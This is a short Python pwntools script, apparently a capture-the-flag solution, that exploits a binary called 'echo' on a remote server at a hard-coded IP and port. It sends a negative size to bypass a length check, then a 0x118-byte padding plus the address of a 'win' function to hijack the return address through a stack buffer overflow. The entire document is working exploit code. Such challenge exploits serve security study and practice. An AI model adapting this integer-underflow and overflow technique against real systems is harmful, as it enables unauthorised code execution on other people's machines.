from pwn import *
from struct import pack
import time
sock = remote("34.170.146.252", 55322)
time.sleep(0.5)

elf = ELF("./echo")
size = 0x80000000
sock.sendlineafter(b"Size: ", "-"+str(size))

payload = b"a"*0x118
payload += p64(elf.symbols["win"])
sock.sendlineafter(b"Data: ", payload)
sock.recvline()

print(sock.recvline().decode())
sock.close()
